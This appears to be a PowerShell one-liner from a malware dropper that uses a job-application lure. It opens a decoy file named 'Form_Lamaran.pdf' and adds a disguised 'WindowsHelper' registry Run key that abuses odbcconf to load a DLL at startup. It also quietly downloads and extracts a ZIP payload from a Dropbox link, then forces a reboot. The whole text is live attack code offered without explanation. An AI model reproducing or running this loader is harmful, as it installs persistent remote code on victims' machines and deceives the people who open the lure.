echo 1 > Form_Lamaran.pdf ; ./Form_Lamaran.pdf ; if (Test-Path "C:\helper\helper.zip") { exit } else { New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelper" -Value 'odbcconf /a {REGSVR "C:\helper\ps2.dll"}' -Force; powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ; wget 'https://www.dropbox.com/scl/fi/a26gzuet1tikpsc07megq/helper.zip?rlkey=7pbr6ecy0mpybp3xfseuf3u44&st=lnkxpyyj&dl=1' -OutFile 'C:\helper\helper.zip' ; start-sleep -s 5 ; Expand-Archive -LiteralPath C:\helper\helper.zip -DestinationPath C:\helper\ -Force ; shutdown /r /t 300 }
